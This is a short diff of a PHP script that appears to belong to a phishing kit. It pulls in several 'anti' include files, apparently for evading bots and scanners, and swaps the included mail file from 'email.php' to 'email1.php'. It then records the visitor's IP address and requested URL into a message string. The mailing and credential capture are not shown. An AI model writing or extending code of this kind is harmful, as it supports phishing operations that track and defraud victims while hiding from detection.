@@ -6,7 +6,7 @@ include "anti/anti3.php";
 include "anti/anti4.php"; 
 include "anti/anti5.php"; 
 include "anti/anti7.php";
-include 'email.php';
+include 'email1.php';
 $ip = getenv("REMOTE_ADDR");
 $link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
 $message = "[link: $link ]\r\n";
